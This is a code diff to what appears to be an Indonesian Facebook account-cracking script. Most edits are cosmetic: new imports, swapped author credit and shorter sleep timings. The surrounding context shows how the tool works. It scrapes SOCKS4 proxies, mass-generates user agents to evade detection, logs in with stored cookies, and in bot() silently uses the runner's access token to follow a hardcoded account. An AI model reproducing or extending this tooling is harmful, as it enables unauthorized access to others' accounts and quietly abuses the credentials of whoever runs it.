@@ -23,6 +23,9 @@ from rich.markdown import Markdown as mark
 from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
+from rich.console import Console
+from rich.panel import Panel
+from rich.style import Style
 #------------------[  MODULE  ]-------------------#
 try:
         import rich
@@ -39,6 +42,11 @@ try:
 except ImportError:
 	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
 	os.system('pip install requests && pip install mechanize ')
+try:
+	import requests
+except ImportError:
+	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
+	os.system('pip install requests ipinfo ')
 	
 #------------------[ USER-AGENT ]-------------------#
 pretty.install()
@@ -54,7 +62,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
+	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKhoirul-Xd')
 prox=open('.prox.txt','r').read().splitlines()
 for ut in range(10000):
 	rr = random.randint
@@ -191,6 +199,11 @@ try:times = cek_data["timezone"]
 except:times = cek_data['-']
 try:city = cek_data["city"]
 except:city = cek_data['-']
+from rich import print
+import requests
+import geocoder
+from rich.console import Console
+
 #--------------------[ CONVERTER-BULAN ]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
@@ -236,15 +249,16 @@ def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(0.05)
+        time.sleep(0.03)
 def loading():
     animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
     for i in range(50):
-        time.sleep(0.05)
+        time.sleep(0.03)
         sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
         sys.stdout.flush()
-        time.sleep(0.05)
-#------------------[ LOGO-LAKNAT ]-----------------#
+        time.sleep(0.03)
+
+# ------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
     prints(panel(f"""[bold red]               
      ____             _        _____ _     
@@ -322,7 +336,6 @@ def bot():
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
-		
 #------------------[ BAGIAN LOGIN ]----------------#
 def login():
 	try:
@@ -330,7 +343,7 @@ def login():
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		print('[×] Kues Kadaluarsa ')
-		time.sleep(2)
+		time.sleep(3)
 		login_lagi334()
 	os.system('clear')
 	loading()
